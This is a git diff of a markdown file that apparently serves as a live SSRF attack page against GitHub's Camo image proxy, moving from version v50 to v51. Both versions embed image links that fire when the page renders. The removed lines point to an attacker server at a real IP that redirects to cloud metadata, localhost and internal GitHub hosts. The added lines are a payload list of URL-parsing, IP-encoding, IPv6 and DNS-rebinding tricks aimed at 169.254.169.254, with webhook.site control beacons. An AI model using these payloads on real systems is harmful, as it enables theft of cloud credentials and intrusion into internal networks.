@@ -1,65 +1,106 @@
-# v50: 302 Redirect SSRF Attack - Port 7777
+# v51: Advanced URL Parsing & Bypass Techniques
 
-> **CRITICAL TEST**: Server at `164.90.187.218.nip.io:7777` returns 302 redirects to internal targets.
-> If Camo follows these redirects → **SSRF VULNERABILITY**!
-
----
-
-## 1. Redirect to AWS Metadata (169.254.169.254)
-
-### AWS Metadata via redirect
-![aws-redir](http://164.90.187.218.nip.io:7777/aws-metadata.gif)
-
-### AWS with different path
-![aws2](http://164.90.187.218.nip.io:7777/fetch-aws-creds.gif)
+> Testing URL parsing edge cases that might bypass Camo's URL validation
 
 ---
 
-## 2. Redirect to localhost/127.0.0.1
+## 1. URL Parsing Confusion (@ symbol - credentials in URL)
 
-### Localhost redirect
-![local](http://164.90.187.218.nip.io:7777/local-test.gif)
+### @ before hostname (credentials parsing)
+![at1](http://webhook.site@169.254.169.254/latest/meta-data/)
 
-### 127.0.0.1 direct
-![127](http://164.90.187.218.nip.io:7777/local-127.gif)
+### Double @ 
+![at2](http://foo@bar@169.254.169.254/)
 
----
-
-## 3. Redirect to Internal Hostnames
-
-### internal.github.com
-![github-internal](http://164.90.187.218.nip.io:7777/github-internal.gif)
+### @ with encoded chars
+![at3](http://webhook.site%40169.254.169.254/)
 
 ---
 
-## 4. Redirect to Other Cloud Metadata
+## 2. Backslash vs Forward Slash Confusion
 
-### GCP metadata (169.254.169.254 or metadata.google.internal)
-![gcp](http://164.90.187.218.nip.io:7777/aws-gcp.gif)
+### Backslash in path
+![bs1](http://169.254.169.254\latest\meta-data\)
 
-### Azure metadata (169.254.169.254)
-![azure](http://164.90.187.218.nip.io:7777/aws-azure.gif)
-
----
-
-## 5. Control Tests
-
-### Redirect to webhook.site (should work)
-![webhook-redir](http://164.90.187.218.nip.io:7777/test-webhook.gif)
-
-### Direct webhook.site control
-![control](https://webhook.site/1873d398-52fb-46cf-b86a-d4aa58c4ad9d/v50-control.gif)
+### Mixed slashes
+![bs2](http://webhook.site\/169.254.169.254)
 
 ---
 
-## Server Configuration
+## 3. URL Fragment Tricks
 
-Server at `164.90.187.218:7777` returns 302 redirects:
-- `/aws*` → `http://169.254.169.254/latest/meta-data/`
-- `/local*` → `http://127.0.0.1/`
-- `/github*` → `http://internal.github.com/`
-- `/*` → `http://webhook.site/redirect-success`
+### Fragment before host (browser vs server parsing)
+![frag1](http://foo#@169.254.169.254/)
+
+### Double fragment
+![frag2](http://169.254.169.254/#foo#bar)
 
 ---
 
-**v50** - Testing if Camo follows 302 redirects to internal targets (SSRF)
+## 4. Unicode/IDN Domain Tricks
+
+### IDN homograph - аws (Cyrillic 'а')
+![idn1](http://аws.amazon.com/test.gif)
+
+### Mixed script domain
+![idn2](http://169。254。169。254/test)
+
+---
+
+## 5. Port Tricks
+
+### Port 80 explicit
+![port1](http://169.254.169.254:80/latest/meta-data/)
+
+### Port 0
+![port2](http://169.254.169.254:0/latest/)
+
+### Port 65535
+![port3](http://169.254.169.254:65535/)
+
+---
+
+## 6. Decimal/Octal/Hex IP Encoding
+
+### Decimal IP (already tested but retry)
+![dec1](http://2852039166/latest/meta-data/)
+
+### Octal with leading zeros
+![oct1](http://0251.0376.0251.0376/)
+
+### Mixed encoding
+![mix1](http://169.0xfe.169.0xfe/)
+
+---
+
+## 7. IPv6 Tricks
+
+### IPv6 localhost
+![ipv6-1](http://[::1]/)
+
+### IPv6 mapped IPv4 - link-local
+![ipv6-2](http://[::ffff:169.254.169.254]/)
+
+### IPv6 short form
+![ipv6-3](http://[0:0:0:0:0:ffff:a9fe:a9fe]/)
+
+---
+
+## 8. DNS Rebinding Service
+
+### rbndr.us rebind service
+![rebind1](http://7f000001.c0a80001.rbndr.us/)
+
+### 1u.ms rebind
+![rebind2](http://make-169.254.169.254-rr.1u.ms/)
+
+---
+
+## 9. Control Test
+
+### Direct webhook
+![control](https://webhook.site/1873d398-52fb-46cf-b86a-d4aa58c4ad9d/v51-control.gif)
+
+---
+
+**v51** - Advanced URL parsing bypass attempts
